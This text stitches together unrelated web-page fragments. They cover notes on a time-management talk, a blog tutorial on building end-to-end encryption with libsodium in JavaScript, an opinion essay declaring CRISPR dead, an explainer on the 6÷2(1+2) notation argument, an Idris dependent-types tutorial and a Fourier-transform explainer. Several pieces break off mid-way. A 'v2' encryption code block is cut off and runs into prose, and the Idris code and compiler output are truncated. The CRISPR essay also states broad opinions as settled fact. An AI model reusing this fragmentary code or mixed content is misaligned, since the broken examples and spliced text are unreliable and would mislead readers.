      <p><strong>Learn to say no.</strong> Opportunity cost is real. "Gentle no" = "I'll be your backup". "If you need an 8th person I'll be there."</p>
    </li>
    <li>
      <p>Find your creative time and defend it ruthlessly. It varies for people - could be 10pm-Midnight.</p>
    </li>
    <li>
      <p>Find your dead time and do stuff where you don't need to be at your best.</p>
    </li>
    <li>
      <p><strong>Interruption</strong> takes 6-9mins, but recovery takes 4-5mins. Got to find ways to reduce frequency of interruptions. Turn phone calls into emails. Batch interactions with other people.</p>

    <li>
      <p>Giving hints to cut meetings short: Get up, walk to the door, thank them, shake their hand. Walk them out of the room.</p>
    </li>
    <li>
      <p><strong>Time journals</strong> - monitor and update thru the day. <a href="http://www.cs.unc.edu/Events/News/VirtuousReality/">Fred Brooks had actual time clocks</a>.</p>
    </li>
    <li>
      <p>Look at open blocks where you know you are going to be wasting time, as gaps between blocks - make up a fake class.</p>
    </li>
    <li>
      <p>Delegate.</p>
    </li>
    <li>
      <p>"How am I wasting other people's time?"</p>
    </li>

  <ul>
    <li>Sometimes you get lucky - if you wait long enough you may not have to do it</li>
    <li>Sometimes you want to avoid Parkinson's Law - Work expands to fill the time available for it.</li>
    <li>But key realization - doing things at the last minute is very expensive. If you push things up to the deadline that's where all the stress comes from</li>
    <li>Make a fake deadline and pretend it is real.</li>
    <li>Identify why you're procrastinating - afraid you are going to fail? scared to ask somebody for something? Sometimes you just have to ask.</li>

    <li>Don't be vague:
      <ul>
        <li>Give specific thing to do</li>
        <li>Specific date/time</li>
        <li>Specific penalty/reward</li>
      </ul>
    </li>
    <li>Challenge people: delegate until they complain</li>
    <li>Communication has to be CLEAR - and written</li>
    <li>Don't tell them HOW to do it - tell them what you need done, let them come up with solutions. This is how to work with people smarter than you.</li>
    <li>Offer relative importance - so people know what order to do them in</li>
    <li>Beware upward delegation - step back.</li>
    <li>Carrots &gt; Sticks. Reinforce behavior you like. "Thank you I really appreciate you did a good job."</li>

      <p>He often uses humor - noting the optimistic side of his very grim situation, giving some relief to his audience while also reminding them of the importance of his message.</p>
    </li>
    <li>
      <p>He is also extremely respectful - being humble to specific members of the audience ("Gabe is REALLY in good shape", "I am NOT smarter than Jim Calhoun", "Am I giving a talk with Alf Weaver in the audience?"), as well as the venue/general audience itself ("there aren't many better PhD programs in history than this one").</p>
    </li>
    <li>
      <p>He brings in personal stories and examples, often involving his wife, and they are usually relatable and funny. His slides use photos from his own life living the things he talks about.</p>
    </li>
    <li>
      <p>The anecdotes also inject some variety - 40 minutes in he breaks for a tangent about his dog and a tiny debate he had with his wife.</p>
    </li>
    <li>
      <p>Vocal variation - 53 minutes in he screams "PUT THE CIGARETTE OUT MOM" and that is a nice spike in decibels.</p>
    </li>
    <li>
      <p>Ending is really good: He ends with actionable things to do, and a nice reminder of why this is important:</p>
      <blockquote>
        <p>"If I haven't changed anything, then we still had a pleasant hour together. If you have changed things, then you'll probably have a lot more time to spend with the ones you love. And that's important, time is all we have. And you may find one day, you have less than you think."</p>

		<div>

			
<p>Governments are back on their anti-encryption bullshit again.</p>



<p>Between the <a href="https://blog.cryptographyengineering.com/2020/03/06/earn-it-is-an-attack-on-encryption/">U.S. Senate’s “EARN IT” Act</a>, the <a href="https://www.eff.org/deeplinks/2020/10/orders-top-eus-timetable-dismantling-end-end-encryption">E.U.’s slew of anti-encryption proposals</a>, and <a href="https://fee.org/articles/australia-s-unprecedented-encryption-law-is-a-threat-to-global-privacy/">Australia’s new anti-encryption law</a>, it’s become clear that the authoritarians in office view online privacy as a threat to their existence.</p>



<p>Normally, when the governments increase their anti-privacy sabre-rattling, technologists start talking more loudly about Tor, Signal, and other privacy technologies (usually only to be drowned out by paranoid people who think Tor and Signal are government backdoors or something stupid; conspiracy theories ruin everything!).</p>



<p><strong>I’m not going to do that.</strong></p>



<p>Instead, I’m going to show you how to add end-to-end encryption to any communication software you’re developing. (Hopefully, I’ll avoid making <a href="https://soatok.blog/2020/10/28/bizarre-design-choices-in-zooms-end-to-end-encryption/">any bizarre design decisions</a> along the way.)</p>



<p>But first, some important disclaimers:</p>



<ol><li><strong>Yes, you should absolutely do this.</strong> I don’t care how banal your thing is; if you expect people to use it to communicate with each other, you should make it so that you can never decrypt their communications.</li><li>You should absolutely NOT bill the thing you’re developing as an <em>alternative</em> to Signal or WhatsApp.</li><li>The goal of doing this is to increase the amount of end-to-end encryption deployed on the Internet that the service operator cannot decrypt (even if compelled by court order) and make E2EE normalized. The goal is NOT to compete with highly specialized and peer-reviewed privacy technology.</li><li>I am not a lawyer, I’m some furry who works in cryptography. The contents of this blog post is not legal advice, nor is it endorsed by any company or organization. Ask the <a href="https://eff.org/">EFF</a> for legal questions.</li></ol>



<p>The organization of this blog post is as follows: First, I’ll explain <a href="#symmetric-key-encryption">how to encrypt and decrypt data between users</a>, assuming you have a key. Next, I’ll explain <a href="#key-agreement">how to build an authenticated key exchange</a> and <a href="#session-key-management">a ratcheting protocol to determine the keys used in the first step</a>. Afterwards, I’ll explore <a href="#identity-key-management">techniques for binding authentication keys to identities and managing trust</a>. Finally, I’ll discuss <a href="#backdoor-resistance">strategies for making it impractical to ever backdoor your software (and impossible to silently backdoor it)</a>, just to piss <a href="https://en.wikipedia.org/wiki/Five_Eyes">the creeps and tyrants of the world</a> off even more.</p>



<p>You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing.</p>







<h2 id="preliminaries">Preliminaries</h2>



<h3 id="choosing-a-cryptography-library">Choosing a Cryptography Library</h3>



<p>In the examples contained on this page, I will be using the <a href="https://libsodium.gitbook.io/doc/">Sodium cryptography library</a>. Specifically, my example code will be written with the <a href="https://github.com/paragonie/sodium-plus">Sodium-Plus</a> library for JavaScript, since it strikes a good balance between performance and being cross-platform.</p>



<pre><code>const { SodiumPlus } = require('sodium-plus');

(async function() {
     // Select a backend automatically
     const sodium = await SodiumPlus.auto();
     
     // Do other stuff here
})();</code></pre>



<p>Libsodium is <a href="https://latacora.micro.blog/2018/04/03/cryptographic-right-answers.html">generally the correct choice for developing cryptography features in software</a>, and is available in most programming languages,</p>



<p>If you’re prone to choose a different library, you should consult your cryptographer (and yes, you should have one on your payroll if you’re doing things different) about your design choices.</p>



<h3>Threat Modelling</h3>



<p>Remember above when I said, “You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing”?</p>



<p>How far you go in implementing the steps outlined on this blog post should be informed by <a href="https://adamcaudill.com/2016/07/20/threat-modeling-for-applications/">a threat model</a>, not an ad hoc judgment.</p>



<p>For example, if you’re encrypting user data and storing it in the cloud, you probably want to pass <a href="https://blog.cryptographyengineering.com/2012/04/05/icloud-who-holds-key/">the Mud Puddle Test</a>:</p>



<blockquote><div><p>1. First, drop your device(s) in a mud puddle.<br>2. Next, slip in said puddle and crack yourself on the head. When you regain consciousness you’ll be perfectly fine, but<em>&nbsp;won’t for the life of you&nbsp;</em>be able to&nbsp;recall your device passwords or keys.<br>3. Now try to get your cloud data back.</p><p>Did you succeed? If so, you’re screwed. Or to be a bit less dramatic, I should say: your cloud provider has access to your ‘encrypted’ data, as does the government if they want it, as does any rogue employee who knows their way around your provider’s internal policy checks.</p></div><cite>Matthew Green describes the Mud Puddle Test, which Apple products <a href="https://sneak.berlin/20201112/your-computer-isnt-yours/">definitely don’t pass</a>.</cite></blockquote>



<p>If you must fail the Mud Puddle Test for your users, make sure you’re clear and transparent about this in the documentation for your product or service.</p>







<h2 id="symmetric-key-encryption">I. Symmetric-Key Encryption</h2>



<p>The easiest piece of this puzzle is to encrypt data in transit between both ends (thus, satisfying the loosest definition of end-to-end encryption).</p>



<p>At this layer, you already have some kind of symmetric key to use for encrypting data before you send it, and for decrypting it as you receive it.</p>



<p>For example, the following code will encrypt/decrypt strings and return hexadecimal strings with a version prefix.</p>


<pre title="">const VERSION = "v1";

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function encryptData(message, key, assocData = null) {
    const nonce = await sodium.randombytes_buf(24);
    const aad = JSON.stringify({
      'version': VERSION,
      'nonce': await sodium.sodium_bin2hex(nonce),
      'extra': assocData
    });

    const encrypted = await sodium.crypto_aead_xchacha20poly1305_encrypt(
        message,
        nonce,
        key,
        aad
    );
    return (
       VERSION +
       await sodium.sodium_bin2hex(nonce) +
       await sodium.sodium_bin2hex(encrypted)
    );
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function decryptData(encrypted, key, assocData = null) {
    const ver = encrypted.slice(0, 2);
    if (!await sodium.sodium_memcmp(ver, VERSION)) {
        throw new Error("Incorrect version: " + ver);
    }
    const nonce = await sodium.sodium_hex2bin(encrypted.slice(2, 50));
    const ciphertext = await sodium.sodium_hex2bin(encrypted.slice(50));
    const aad = JSON.stringify({
      'version': ver,
      'nonce': encrypted.slice(2, 50),
      'extra': assocData
    });
    
    const plaintext = await sodium.crypto_aead_xchacha20poly1305_decrypt(
        ciphertext,
        nonce,
        key,
        aad
    );
    return plaintext.toString('utf-8');
}
</pre>


<p>Under-the-hood, this is using <a href="https://soatok.blog/2020/07/12/comparison-of-symmetric-encryption-methods/#aes-gcm-vs-xchacha20poly1305">XChaCha20-Poly1305</a>, which is less sensitive to timing leaks than AES-GCM. However, like AES-GCM, this encryption mode doesn’t provide <a href="https://eprint.iacr.org/2019/016">message- or key-commitment</a>.</p>



<p>If you want key commitment, you should derive two keys from <code>$key</code> using a KDF based on hash functions: One for actual encryption, and the other <a href="https://eprint.iacr.org/2020/1153">as a key commitment value</a>.</p>



<p>If you want message commitment, you can use AES-CTR + HMAC-SHA256 or XChaCha20 + BLAKE2b-MAC.</p>



<p>If you want both, ask <a href="https://mumble.net/~campbell/">Taylor Campbell</a> about his BLAKE3-based design.</p>



<p>A modified version of the above code with key-commitment might look like this:</p>


<pre title="">const VERSION = "v2";

<p>Another design choice you might make is to encode ciphertext with base64 instead of hexadecimal. That doesn’t significantly alter the design here, but it does mean your decoding logic has to accommodate this.</p>



<p>You SHOULD version your ciphertexts, and include this in the AAD provided to your AEAD encryption mode. I used “v1” and “v2” as a version string above, but you can use your software name for that too.</p>

Essentially this was the CRISPR Nobel Prize. If enough of CRISPR has already come so that it is worthy of a Nobel Prize I can’t imagine there is much place to go from here.&nbsp;</span></p><p><span id="docs-internal-guid-4bf038d4-7fff-ec28-e41c-6ded5276f0c8"><p dir="ltr"><span>Modifying the genome of organisms has always been of great interest to scientists. Adding or removing genes allows us to understand how things work and allows us to create microorganisms, plants or animals(humans are animals right?) that have traits never seen before. Knowingly modifying the genome of organisms has been done since people understood breeding. Inserting specific DNA elements began in the 1970s but it wasn’t very targeted and was mostly just inserting genes into random places in genomes. It wasn’t until the 1990s that people started to be able to do targeted genome modifications.&nbsp;</span></p><p dir="ltr"><span>Targeted genome modifications allow highly specific and accurate changes to an organism’s DNA. The co-opting of the cellular mechanism of homologous recombination is the backbone of all modern genome editing technologies including Zinc Finger Nucleases(ZFNs), Transcription activator-like effector nuclease(TALENs) and Clustered regularly Interspaced Short Palindromic Repeats(CRISPR). Both ZFNs and TALENs are mostly synthetic, i.e. they contain a portion that can be engineered to target DNA and a synthetically attached nuclease that will cleave DNA to initiate recombination and gene editing. CRISPR is almost completely natural which makes one wonder how there are so many patents on it’s use, yikes. </span></p><p dir="ltr"><span>CRISPR can modify most any living cell but so can ZFNs, TALENs and other technologies. So why then was CRISPR </span><span><a href="https://www.technologyreview.com/2014/12/04/170211/who-owns-the-biggest-biotech-discovery-of-the-century/">heralded as the discovery of the century</a></span><span> by the MIT Tech Review? Simply, CRISPR is just easier to use because it uses nucleic acid targeting. That makes it cost less and take less time to produce genetic modifications.&nbsp;</span></p><p dir="ltr"><span>So what has CRISPR made possible? Not much really. Most everything done with CRISPR can be done with one of these other technologies albeit these others are slower and more expensive. CRISPR allows the scaling of genetic engineering so that time and money are much less of a factor. It is the cloud computing of biology at least in my mind.</span></p><p dir="ltr"><span>Despite claims by scientists and pharma companies there is little chance CRISPR will ever be widely used in the clinic to directly treat disease. That is because it suffers from all the same faults as its predecessors and maybe even more so. Gene editing has low efficiency in adult animals(yes humans are animals) no matter the technique used. For instance, if you have a disease that affects the brain you can probably only modify &lt;1% of cells even using the best delivery techniques available.&nbsp;Really, the only way to get rid of genetically inherited diseases using gene editing is by modifying embryos.&nbsp;</span></p><p dir="ltr"><span>Misleading as it has been CRISPR can’t actually make specific changes to a gene easily in an adult animal. That is because it requires what is called a donor template, basically just a DNA template that cells can use to create the genome modifications. There is no efficient way to use donor templates in an adult animal so all genome edits would need to be gene knock-outs only i.e. you can only use CRISPR to destroy bad genes not modify them to make them good genes. As you can imagine this is very limited in scope when it comes to diseases that can and should be reasonably targeted using genome editing.</span></p><p dir="ltr"><span>To date all human clinical trials involve gene editing technology whether CRISPR or otherwise have failed to show any change in the disease condition. I don’t see this as likely to change. While there might be a disease that can be helped despite the low efficiency of CRISPR chances are that normal gene therapy, that doesn’t edit the genome, will be easier and more successful. There are very few diseases that would require genome editing as opposed to just adding an extra copy of the gene to cells like gene therapy does. It’s not all just conjecture either, just recently in August 2020 the pharma giant Abbvie ended a partnership it had with Editas, one of the major CRISPR players. Apparently, I’m not the only one who sees CRISPR's future in the clinic as limited.</span></p><p dir="ltr"><span>So what applications are left for CRISPR besides contributing to research? Some people are betting on diagnostics, using CRISPR’s ability to target specific sequences of DNA. While this seems reasonable it is unlikely that tried and true methods for DNA detection that use PCR will ever be significantly deplatformed. After that we are scraping the bottom of the bowl of guac.</span></p><p dir="ltr"><span>I have been around CRISPR since near the beginning. The only thing that has remained constant is the hype. Even that has been fading. While it is hard to measure hype Google Trends indicates that for 2020 the topic and search term CRISPR is on track to be the lowest searched since 2016. We now know that CRISPR gene drives don’t really work. No success for CRISPR in the clinic. CRISPR has already been used to edit human embryos. Really, the only thing keeping CRISPR hype alive is probably the MIT Tech Review. </span><span><br></span><span><br></span><span>In 2006, RNAi gene silencing was given the Nobel Prize. MIT called it the </span><a href="https://news.mit.edu/2003/rnai-0108"><span>breakthrough of the decade</span></a><span>. I remember everyone being so excited about it! It was the hot topic at conferences and even my graduate school interviews. While RNAi was and always has been a great benefit to researchers its actual application has been extremely limited. It’s taken 13 years from the RNAi Nobel Prize to bring something to the clinic and even then the two drugs have been a bit underwhelming. According to Google Scholar, papers even mentioning RNAi have been on the decline for the past 6 years. The drug approved in the past few years haven't even slowed the decline.</span></p><p dir="ltr"><span>I am sure people will continue to use CRISPR for years to come but I hate to break it to you CRISPR is dead.</span></p><br></span></p>

I’ve seen the same thing on Facebook and I often get caught up with the verocity that people argue with each other. The trick is usually the same, but in this specific case users come mostly to two answers: \(1\) and \(9\). Which is right? The answer is that they <strong>both are</strong>! Read on for why.</p>  <p>As mentioned, there are roughly two categories of answers: \(1\) and \(9\). There’s also some weird ones, like \(0\) being another common one, but these are primarily arithmetic mistakes. First, let’s focus on how someone would arrive at \(9\).</p> <p>Remember PEMDAS? You may have also learned it as BEDMAS. This is a rule taught that helps you remember the order of operations for algebraic notation. We follow this order: <strong>P</strong>arentheses, <strong>e</strong>xponents, <strong>m</strong>ultiplication / <strong>d</strong>ivision, and then <strong>a</strong>ddition / <strong>s</strong>ubtraction. You do each of these steps from left to right. Note that multiplication / division as well as addition / subtraction happen at the same time, rather than multiplication <em>followed by</em> division for example (ironically that leads to a valid answer for invalid reasons and further fuels argument).</p> <p>If you strictly follow PEMDAS you get this result:</p><p> \[6 \div 2(1 + 2) \\ 6 \div 2(3) \\ 6 \div 2 \times 3 \\ 9\] </p><p>Did you see what happened in that second step? Let’s re-look:</p><p> \[6 \div 2(3) \\ 6 \div 2 \times 3\] </p><p>Keep that in mind as we look at what the second category of users, those who concluded the answer is \(1\), are doing:</p><p> \[6 \div 2(1 + 2)\\ 6 \div 2(3)\\ 6 \div 6\\ 1\] </p><p>Did you see the difference? Users who conclude \(1\) multiplied \(2\) and \(3\) together <strong>before</strong> evaluating the multiplication and division left-to-right. You might think “that’s not following PEMDAS!” and you would be right. So why are they doing this?</p> <p>The notation \(2(3)\) can be called an <em><a href="https://www.themathdoctors.org/order-of-operations-implicit-multiplication/">implicit multiplication by juxtaposition</a></em>. It’s <em>implicit</em> because there is no actual multiplication symbol, and it’s understood to be multiplication with the brackets because it’s <em>juxtaposed</em> (“close to”) with them.</p> <p>In some notations it is a common convention to treat these implied multiplications as <em>higher priority</em> than other multiplications. For example you might see authors write things like \(\frac{x}{2(3x + y)}\) as \(x \div 2(3x + y)\), which is different than \(x \div 2 \times (3x + y)\).</p>  <p>So who is correct? A math expression must have only one real answer right? The point of math is it is supposed to be true and inarguable, right?</p> <p>That’s all fair, but “math” is different than “math notation”. Mathematics models real relationships in our physical world, but the things we write down are just an agreed upon language for communicating it.</p> <p>For example, if there is a four legged creature with a cute nose right in front of me:</p> <p><img src="https://fosterelli.co/image/why-twitter-cant-agree-on-a-simple-math-equation/dog.jpg" alt="A cute dog doing some math"></p> <p>and I tell you that I see <em>a dog</em>, you know what I mean. But if I only spoke Spanish and I called it <em>un perro</em>, you may not know what I meant. That doesn’t change the inarguable fact that there is a furry four legged creature in front of me, but you might only understand what I’m trying to communicate if we’re speaking the same notation.</p> <p>There’s lots of examples of this in math. Take something as simple as \(\times\). It should always mean multiplication right? Well, in vector algebra, everyone agreed that \(\times\) actually means something called the <em><a href="https://en.wikipedia.org/wiki/Cross_product#Definition">cross product</a></em> of two vectors, denoted by the formula \(a \times b = \left\| a \right\| \left\| b \right\| \sin(\theta) n\) or to demonstrate visually:</p> <p><img src="https://fosterelli.co/image/why-twitter-cant-agree-on-a-simple-math-equation/vector.png" alt="A visual example of the cross product"></p> <p>There is some overlapping intuition, but this obviously looks and feels nothing like arithmetic multiplication, which is a series of repeated additions. However that’s what we decided to use \(\times\) for when talking about vectors. There are many examples of overlapping notation in math. As long as we agree and can communicate mathematical ideas, the notation isn’t really important.</p> <p>So what users really disagree about is <em>how to read this equation</em>. Does the author who wrote this equation mean \(6 \div 2 \times (1 + 2)\) or do they mean \(6 \div (2 \times (1 + 2))\)? If this was in a textbook, or part of a larger series of equations, it would be clear from the context. With only this single equation to go on, it’s actually unclear what the author intended. Both interpretations are valid.</p>  <p>Of course the vagueness is deliberate in this case. It gets everyone on social media riled up as they think <em>obviously</em> their understanding is correct and <em>obviously</em> the other person is wrong. <em>Didn’t they take 5th grade math?!</em> But really – both groups are making reasonable interpretations and the equation itself is poorly written. If you were to give someone an equation with no other context at all, you should <em>always</em> use appropriate brackets to make it clear what you are communicating.</p> <p>For more fun, you can see that even calculators themselves will differ on how to interpret this question. Some calculators process input left-to-right, some follow PEMDAS, and others will follow PEMDAS while giving implicit multiplication by juxtaposition a higher priority.</p> <blockquote data-conversation="none" width="400"><p lang="en" dir="ltr">Different calculators give different answers - it depends on the choices made by the people making them. In the last pic it automatically added parentheses when giving the answer, it’s just down to convention chosen: <a href="https://t.co/DB9J9j2zTx">pic.twitter.com/DB9J9j2zTx</a></p>— Dave (@DavePunFun) <a href="https://twitter.com/DavePunFun/status/1327327770750271488?ref_src=twsrc%5Etfw">November 13, 2020</a></blockquote>  <p>The real solution is to make this a more official rule that standard education teaches. Right now this is something that students in later education mostly learn by convention – which leads to a lot of confusion when people clearly interpret it differently but have a hard time explaining <em>why</em>. Textbooks can also be awful as they might explain PEMDAS and then give the implicit multiplication priority with no explicit mention of how that works.</p> <p>Anyway, I see something similar on Facebook, Instagram, or Twitter every few months and I thought it was worth writing up a beginner-friendly explanation that I can reference later. Hopefully it was helpful to you too!</p>  </div>  </div> </div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>Most programming languages barely differ from each other apart from superficial syntax differences, but not Idris. Idris, having a type system supporting dependent types and other innovative ideas, opens up a host of possibilities few other language provides.</p>

<p>When we want to ensure that a piece of code works as intended the usual tool we use is testing. Testing provides plenty of benefits, but wouldn’t you prefer to encode your tests right in the type signature and let the compiler decide if your code is correct given those constraints? With Idris you can do exactly that.</p>

<p>Let’s investigate how by comparing a very simple list operation, append, also called (++) in Haskell and Idris. Append in Haskell has the following type signature:</p>

<figure><pre><code data-lang="haskell"><span>Prelude</span><span>&gt;</span> <span>:</span><span>t</span> <span>(</span><span>++</span><span>)</span>
<span>(</span><span>++</span><span>)</span> <span>::</span> <span>[</span><span>a</span><span>]</span> <span>-&gt;</span> <span>[</span><span>a</span><span>]</span> <span>-&gt;</span> <span>[</span><span>a</span><span>]</span></code></pre></figure>

<p>Sharing most of the syntax and lot of the type system with Haskell, the append for lists looks very similar in Idris:</p>

<figure><pre><code data-lang="haskell"><span>Idris</span><span>&gt;</span> <span>:</span><span>t</span> <span>(</span><span>++</span><span>)</span>
<span>Prelude</span><span>.</span><span>List</span><span>.</span><span>(</span><span>++</span><span>)</span> <span>:</span> <span>List</span> <span>a</span> <span>-&gt;</span> <span>List</span> <span>a</span> <span>-&gt;</span> <span>List</span> <span>a</span>
<span>Prelude</span><span>.</span><span>Strings</span><span>.</span><span>(</span><span>++</span><span>)</span> <span>:</span> <span>String</span> <span>-&gt;</span> <span>String</span> <span>-&gt;</span> <span>String</span>
<span>Prelude</span><span>.</span><span>Vect</span><span>.</span><span>(</span><span>++</span><span>)</span> <span>:</span> <span>Vect</span> <span>m</span> <span>a</span> <span>-&gt;</span> <span>Vect</span> <span>n</span> <span>a</span> <span>-&gt;</span> <span>Vect</span> <span>(</span><span>m</span> <span>+</span> <span>n</span><span>)</span> <span>a</span></code></pre></figure>

<p>When we have a look at the Prelude.List.(++), we can see that it matches the Haskell version - it tells us that it takes two lists and returns a third one - it doesn’t say a single word about the lengths of those lists. But if we look at append for the Prelude.Vect type (vectors are a kind of lists with a size), we see the signature describing the size of the vector:</p>

<figure><pre><code data-lang="haskell"><span>Prelude</span><span>.</span><span>Vect</span><span>.</span><span>(</span><span>++</span><span>)</span> <span>:</span> <span>Vect</span> <span>m</span> <span>a</span> <span>-&gt;</span> <span>Vect</span> <span>n</span> <span>a</span> <span>-&gt;</span> <span>Vect</span> <span>(</span><span>m</span> <span>+</span> <span>n</span><span>)</span> <span>a</span></code></pre></figure>

<p>In dependent type terminology a vector is a list indexed over its length, or in laymen’s terms the type of a vector is a list with a size. This is remotely similar to the concept of fixed sized arrays, (for example, in Go) a [4]int is not the same type as a [5]int. However in Idris, we can not only describe that those lists have different type, but as we can see above we can also express how a given property - in this case the length of a list - changes as a result of a function. As <a href="http://en.wikipedia.org/wiki/Formal_verification">Wikipedia succintly states</a>:</p>

<blockquote>
  <p>A promising type-based verification approach is dependently typed programming, in which the types of functions include (at least part of) those functions’ specifications, and type-checking the code establishes its correctness against those specifications.</p>
</blockquote>

<p>To understand the importance of this it is not enough to inspect the the above functions’ type signature. What meets the eye there could be considered documentation. But the real epiphany comes when we start to implement a function after specifying its signature. Let’s examine the source code of <a href="https://github.com/idris-lang/Idris-dev/blob/43127b17a765dbab2e7bcb6be2f6f2efc7a42386/libs/base/Data/VectType.idr#L181">append</a>:</p>

<figure><pre><code data-lang="haskell"><span>|||</span> <span>Append</span> <span>two</span> <span>vectors</span>
<span>(</span><span>++</span><span>)</span> <span>:</span> <span>Vect</span> <span>m</span> <span>a</span> <span>-&gt;</span> <span>Vect</span> <span>n</span> <span>a</span> <span>-&gt;</span> <span>Vect</span> <span>(</span><span>m</span> <span>+</span> <span>n</span><span>)</span> <span>a</span>

<p>But what happens if we intentionally brake the implementation, for example by appending the first argument to itself and ignoring the second argument entirely? The resulting Vector will have a length of <b>m + m</b>, which is clearly different than the <b>m + n</b> stated in the signature.</p>

<figure><pre><code data-lang="haskell"><span>import</span> <span>Data.Vect</span>

<span>vapp</span> <span>:</span> <span>Vect</span> <span>n</span> <span>a</span> <span>-&gt;</span> <span>Vect</span> <span>m</span> <span>a</span> <span>-&gt;</span> <span>Vect</span> <span>(</span><span>n</span> <span>+</span> <span>m</span><span>)</span> <span>a</span>

<p>The compiler tells exactly what we suspected:</p>

        <span>Specifically</span><span>:</span>
                <span>Can't</span> <span>unify</span>
                        <span>plus</span> <span>n</span> <span>n</span>
                <span>with</span>

<span>Metavariables</span><span>:</span> <span>Main</span><span>.</span><span>vapp</span></code></pre></figure>

<p>The above example shows an interesting quality of Idris’ type system: the correctness of the code is checked against any specification in the functions’ type. If the implementation does not meet the specification a compile error is triggered. Naturally, any property not described by those specifications will not interest the compiler. Let’s say we implement our ‘vapp’ function the following way:</p>

<figure><pre><code data-lang="haskell"><span>vapp1</span> <span>:</span> <span>Vect</span> <span>n</span> <span>a</span> <span>-&gt;</span> <span>Vect</span> <span>m</span> <span>a</span> <span>-&gt;</span> <span>Vect</span> <span>(</span><span>n</span> <span>+</span> <span>m</span><span>)</span> <span>a</span>
<span>vapp1</span> <span>Nil</span>               <span>ys</span> <span>=</span> <span>ys</span>
<span>vapp1</span> <span>(</span><span>x</span> <span>::</span> <span>x'</span> <span>::</span> <span>xs</span><span>)</span>   <span>ys</span> <span>=</span> <span>x</span> <span>::</span> <span>x</span> <span>::</span> <span>vapp</span> <span>xs</span> <span>ys</span>
<span>vapp1</span> <span>(</span><span>x</span> <span>::</span> <span>xs</span><span>)</span>         <span>ys</span> <span>=</span> <span>x</span> <span>::</span> <span>vapp</span> <span>xs</span> <span>ys</span></code></pre></figure>

<p>This compiling program almost works perfectly but it does have a quirk; the first element from the first argument is present twice, once on the 1st position correctly, and on the second position incorrectly, deleting the second element:</p>

<figure><pre><code data-lang="haskell"><span>*</span><span>vapp</span><span>&gt;</span> <span>vapp1</span> <span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>]</span> <span>[</span><span>4</span><span>,</span><span>5</span><span>,</span><span>6</span><span>]</span>
<span>[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>6</span><span>]</span> <span>:</span> <span>Vect</span> <span>6</span> <span>Integer</span></code></pre></figure>

<p>So we have proved that whatever is stated in the type signature is guaranteed to be correct - but nothing else may be. In our append example we state that ‘given vector a and vector b, calling append with those vectors as arguments will yield a vector with a length of length a + length b’. It does not state that the resulting vector will contain any element from the argument vectors, or if the order is preserved or anything else! But this is pretty obvious since how could the compiler decide wether a code is correct or not if we do not tell it the criteria to judge a piece of code by. Mind reading based programming is not invented yet, unfortunately.</p>

<p>To say the least, dependent types have the potential to become a new useful tool in a programmer’s toolbox - and there is a certain idealistic beauty in building on top of formally verified, guaranteed to be correct code.</p>

	<p>Fourier transforms are a tool used in a whole bunch of different things. This is an explanation of what a Fourier transform does, and some different ways it can be useful. And how you can make pretty things with it, like this thing:</p>
<canvas id="self-draw" width="500" height="500"></canvas>
<p>I'm going to explain how that animation works, and along the way explain Fourier transforms!</p>
<p>By the end you should have a good idea about</p>
<ul>
<li>What a Fourier transform does</li>
<li>Some practical uses of Fourier transforms</li>
<li>Some pointless but cool uses of Fourier transforms</li>
</ul>
<p>We're going to leave the mathematics and equations out of it for now. There's a bunch of interesting maths behind it, but it's better to start with what it actually does, and why you'd want to use it first. If you want to know more about the how, there's some further reading suggestions below!</p>
<h2 id="sowhatisthisthing">So what is this thing?</h2>
<p>Put simply, the Fourier transform is a way of splitting something up into a bunch of sine waves. As usual, the name comes from some person who lived a long time ago called Fourier.</p>
<p>Let’s start with some simple examples and work our way up. First up we're going to look at waves - patterns that repeat over time.</p>
<p>Here’s an example wave:</p>
<canvas id="combo-sine-wave" width="500" height="300"></canvas>
<p>This wavy pattern here can be split up into sine waves. That is, when we add up the two sine waves we get back the original wave.</p>
<canvas id="combo-sine-wave-split" width="500" height="500"></canvas>
<p>The Fourier transform is a way for us to take the combined wave, and get each of the sine waves back out. In this example, you can almost do it in your head, just by looking at the original wave.</p>
<p>Why? Turns out a lot of things in the real world interact based on these sine waves. We usually call them the wave's frequencies.</p>
<p>The most obvious example is sound – when we hear a sound, we don’t hear that squiggly line, but we hear the different frequencies of the sine waves that make up the sound.</p>



<p>Being able to split them up on a computer can give us an understanding of what a person actually hears. We can understand how high or low a sound is, or figure out what note it is.</p>
<p>We can also use this process on waves that don't look like they're made of sine waves.</p>
<p>Let's take a look at this guy. It’s called a square wave.</p>
<canvas id="square-wave" width="500" height="300"></canvas>
<p>It might not look like it, but it also can be split up into sine waves.</p>
<canvas id="square-wave-split" width="500" height="500"></canvas>
<p>We need a lot of them this time – technically an infinite amount to perfectly represent it. As we add up more and more sine waves the pattern gets closer and closer to the square wave we started with.</p>
<canvas id="square-wave-build-up" width="500" height="500"></canvas>


<p><em>Drag the slider above to play with how many sine waves there are.</em></p>
<p>Visually, you'll notice that actually the first few sine waves are the ones that make the biggest difference. With the slider halfway, we have the general shape of the wave, but it's all wiggly. We just need the rest of the small ones to make the wigglyness flatten out.</p>
<p>When you listen to the wave, you'll hear the sound get lower, because we're removing the higher frequencies.</p>
<p>This process works like that for any repeating line. Give it a go, try drawing your own!</p>


<p><em>Move the slider to see how as we add more sine waves, it gets closer and closer to your drawing</em></p>
<p>Again, aside from the extra wigglyness, the wave looks pretty similar with just half of the sine waves.</p>
<p>We can actually use the fact that the wave is pretty similar to our advantage. By using a Fourier transform, we can get the important parts of a sound, and only store those to end up with something that's pretty close to the original sound.</p>
<p>Normally on a computer we store a wave as a series of points.</p>
<canvas id="wave-samples" width="500" height="500"></canvas>
<p>What we can do instead is represent it as a bunch of sine waves. Then we can compress the sound by ignoring the smaller frequencies. Our end result won't be the same, but it'll sound pretty similar to a person.</p>
<canvas id="wave-frequencies" width="500" height="500"></canvas>
<p>This is essentially what MP3s do, except they're more clever about which frequencies they keep and which ones they throw away.</p>
